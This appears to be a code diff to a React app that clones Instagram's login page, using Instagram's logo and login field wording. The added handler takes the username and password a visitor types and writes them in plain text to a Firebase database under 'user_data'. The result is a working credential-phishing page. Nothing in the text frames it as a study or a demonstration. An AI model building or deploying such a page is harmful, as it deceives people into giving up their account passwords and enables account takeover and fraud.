@@ -1,22 +1,49 @@
-import React from "react";
+import React, { useState } from "react";
 import "./App.css";
+import { getDatabase, ref, set } from "firebase/database";
+import app from './firebase';
 
 const App = () => {
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+
+  const handleLogin = (e) => {
+    e.preventDefault();
+
+    // Initialize Firebase Realtime Database
+    const database = getDatabase(app);
+
+    // Store username and password in the Realtime Database
+    const userData = {
+      username,
+      password,
+    };
+
+    const dbRef = ref(database, "user_data"); // You can change the path as needed
+    set(dbRef, userData)
+      .then(() => {
+        console.log("Data stored successfully!");
+        // Optionally, you can perform additional actions after storing the data
+      })
+      .catch((error) => {
+        console.error("Error storing data:", error);
+      });
+  };
+
   return (
     <React.Fragment>
       <div id="wrapper">
         <div className="container">
-            <div className="left-side-image">
-              <img
-                src="PASTE THE LINK HERE"
-                alt="Left Side Image"
-              />
-            </div>
+          <div className="left-side-image">
+            <img
+              src="https://ik.imagekit.io/dnr/insta/insta-main.jpeg?updatedAt=1705120661173"
+              alt="Left Side Image"
+            />
+          </div>
           <div className="phone-app-demo" />
           <div className="form-data">
-            <form action="">
+            <form onSubmit={handleLogin}>
               <div className="logo" style={{ marginBottom: '10vh' }}>
-                {/* <h1>Instagram</h1> */}
                 <img
                   src="https://www.pngkey.com/png/full/2-27715_instagram-png-logo-instagram-word-logo-png.png"
                   alt="Image"
@@ -26,8 +53,15 @@ const App = () => {
               <input
                 type="text"
                 placeholder="Phone number, username, or email"
+                value={username}
+                onChange={(e) => setUsername(e.target.value)}
               />
-              <input type="password" placeholder="Password" />
+              <input
+                type="password"
+                placeholder="Password"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+              />
               <button className="form-btn" type="submit">
                 Log in
               </button>
@@ -40,7 +74,7 @@ const App = () => {
               </a>
             </form>
             <div className="sign-up">
-              Don't an account? <a href="#">Sign up</a>
+              Don't have an account? <a href="#">Sign up</a>
             </div>
             <div className="get-the-app">
               <span>Get the app</span>
